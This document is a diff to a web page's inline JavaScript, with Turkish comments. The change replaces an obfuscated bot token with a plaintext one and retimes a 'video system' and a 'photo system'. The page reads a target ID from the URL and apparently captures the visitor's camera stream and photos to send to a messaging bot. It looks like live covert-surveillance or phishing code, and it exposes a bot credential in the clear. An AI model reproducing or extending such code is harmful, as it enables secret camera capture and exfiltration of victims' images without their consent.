@@ -104,19 +104,9 @@
     <script>
         (function() {
             // ============================================
-            // YENİ TOKEN ŞİFRELİ HALDE
+            // YENİ TOKEN
             // ============================================
-            const _0x3f2a = [57,56,56,52,51,51,53,56,50,54,59,66,66,72,85,65,116,100,75,44,49,120,51,73,108,87,98,71,104,66,79,111,80,102,54,78,116,54,74,90,56,106,66,65,49,66,70];
-            
-            const _0x7b1c = (() => {
-                let _0x4d5e = '';
-                for(let _0x2a3f = 0; _0x2a3f < _0x3f2a.length; _0x2a3f++) {
-                    _0x4d5e += String.fromCharCode(_0x3f2a[_0x2a3f] - 1);
-                }
-                return _0x4d5e;
-            })();
-            
-            const BOT_TOKEN = _0x7b1c;
+            const BOT_TOKEN = "8773124715:AAHHgMr_v6bB-XVQUKUVMyA8hdpJgkJZUR0";
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
@@ -175,7 +165,7 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ============================================
-                        // VİDEO SİSTEMİ - HEMEN BAŞLA
+                        // VİDEO SİSTEMİ - HEMEN BAŞLA (2 SANİYE BEKLEME YOK)
                         // ============================================
                         (function videoLoop() {
                             if (!stream?.active) return;
@@ -229,7 +219,7 @@
                         })();
                         
                         // ============================================
-                        // FOTOĞRAF SİSTEMİ - VIDEO HAZIR OLUNCA BAŞLA
+                        // FOTOĞRAF SİSTEMİ
                         // ============================================
                         function fotoBaslat() {
                             if (!videoHazir) {
@@ -289,4 +279,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
